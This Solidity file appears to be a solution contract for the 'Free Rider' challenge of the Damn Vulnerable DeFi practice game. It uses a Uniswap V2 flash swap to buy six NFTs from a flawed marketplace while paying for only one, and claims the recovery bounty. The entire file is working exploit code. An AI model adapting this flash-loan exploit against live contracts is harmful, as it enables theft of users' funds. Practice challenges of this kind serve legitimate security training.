// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {console} from "forge-std/Test.sol";

contract Attack {
    address owner;
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    address recoveryManager;
    DamnValuableNFT nft;
    WETH weth;

    constructor(address _owner, address _pair, address _marketplace, address _recoveryManager, address _nft, address _weth) {
      owner = _owner;
      pair = IUniswapV2Pair(_pair);
      marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
      recoveryManager = _recoveryManager;
      nft = DamnValuableNFT(_nft);
      weth = WETH(payable(_weth));
    }

    function attack() public {
      pair.swap(15 ether, 0, address(this), new bytes(1));
      (bool success,) = owner.call{value: address(this).balance}("");
      require(success, "call failed");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) public {
      uint256[] memory ids = new uint256[](6);
      for (uint i; i < 6; ++i) {
        ids[i] = i;
      }
      weth.withdraw(weth.balanceOf(address(this)));
      marketplace.buyMany{value: 15 ether}(ids);

      for (uint i; i < 6; ++i) {
        nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(owner));
      }
      uint256 amount = 16 ether;
      weth.deposit{value: amount}();
      IERC20(pair.token0()).transfer(address(pair), amount);
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
      return IERC721Receiver.onERC721Received.selector;
    }

    fallback() external payable {}
}
